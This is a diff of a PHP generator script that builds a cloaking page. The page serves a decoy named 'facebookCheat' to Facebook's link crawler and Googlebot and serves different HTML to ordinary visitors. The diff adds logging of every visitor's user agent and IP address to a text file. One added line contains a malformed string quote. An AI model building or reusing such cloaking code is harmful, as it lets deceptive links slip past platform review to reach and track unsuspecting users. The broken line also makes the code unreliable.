@@ -282,12 +282,7 @@ if ($_POST["url"]) {
 
     $phpString = '
 <?php
-$agent = $_SERVER[\'HTTP_USER_AGENT\'] . PHP_EOL;
 $text = "agents.txt";
-$fAgent = fopen($text, \'a\');
-fwrite($fAgent, $agent);
-fclose($fAgent);
-
 
 $ip =  $_SERVER[\'REMOTE_ADDR\'];
 function ip_details($ip)
@@ -303,14 +298,21 @@ if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
  strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false
 ) {
+  $fAgent = fopen($text, \'a\');
+  $agent = $_SERVER[\'HTTP_USER_AGENT\'] . PHP_EOL .\' blocked\' . $_SERVER[\'REMOTE_ADDR\'];
+  fwrite($fAgent, $agent);
+  fclose($fAgent);
   echo "' . $facebookCheat . '";
-
 die();
 
  }
 else {
-echo "' . $htmlString . '";
-   die();
+  $fAgent = fopen($text, \'a\');
+  $agent = $_SERVER[\'HTTP_USER_AGENT\'] . PHP_EOL .\' ok\ . $_SERVER[\'REMOTE_ADDR\']';
+    fwrite($fAgent, $agent);
+    fclose($fAgent);
+    echo "' . $htmlString . '";
+    die();
 }
 ?>
 ';
